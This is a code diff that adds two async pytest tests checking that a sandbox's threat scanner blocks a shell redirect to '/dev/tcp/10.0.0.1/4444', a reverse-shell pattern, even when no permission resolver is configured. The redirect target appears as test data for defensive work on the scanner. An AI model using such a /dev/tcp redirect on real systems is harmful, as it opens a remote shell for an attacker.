@@ -310,6 +310,46 @@ async def test_write_redirect_inside_default_scope_is_allowed(tmp_path: Path) ->
 
 
 @pytest.mark.asyncio
+async def test_a_redirect_path_matching_a_threat_pattern_is_denied(tmp_path: Path) -> None:
+    """Tier 2: #6007 BLOCKING (architect co-vet, issuecomment-5580912677)
+    -- a redirect's own PATH is threat-scanned too, not just a segment's
+    argv. Argv-mode's whole-op scan (``sandboxed_exec.py``) sees every
+    token including a redirect target; this module's earlier version
+    never touched ``ExecRedirect.path`` at all -- a surface unique to
+    reaching a redirect through THIS module (cmd-mode) that was left
+    unscanned only here. The reverse-shell pattern (a plain ``/dev/tcp/``
+    substring match) fits directly inside a redirect target path."""
+    ctx, collected = _ctx(tmp_path, threat_scan=ThreatScanConfig())
+    plan = [ExecRedirect(op=">", path="/dev/tcp/10.0.0.1/4444")]
+
+    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
+        await _check(plan, ctx)
+
+    await settle(ctx.events)
+    (scanned,) = [e for e in collected if e.type == "exec_threat_scanned"]
+    assert scanned.data["blocked"] is True
+    assert scanned.data["argv"] == ["/dev/tcp/10.0.0.1/4444"]
+
+
+@pytest.mark.asyncio
+async def test_the_redirect_threat_scan_runs_even_with_no_permission_resolver(
+    tmp_path: Path,
+) -> None:
+    """Tier 2: the redirect threat-scan does not depend on a
+    ``permission_resolver`` being wired -- it denies (with the THREAT
+    reason, not the fail-closed "no permission_resolver" reason from
+    #5991 BLOCKING ①) even when ``permission_resolver=None``, proving the
+    scan runs BEFORE the resolver-presence check, not after."""
+    ctx, _collected = _ctx(
+        tmp_path, permission_resolver=None, threat_scan=ThreatScanConfig(),
+    )
+    plan = [ExecRedirect(op=">", path="/dev/tcp/10.0.0.1/4444")]
+
+    with pytest.raises(PermissionError, match="reverse_shell_devtcp"):
+        await _check(plan, ctx)
+
+
+@pytest.mark.asyncio
 async def test_read_redirect_outside_scope_is_denied(tmp_path: Path) -> None:
     """Tier 2: an ``ExecRedirect("<")`` target outside the configured read
     scope goes through ``require_file_read``, the sibling gate to the
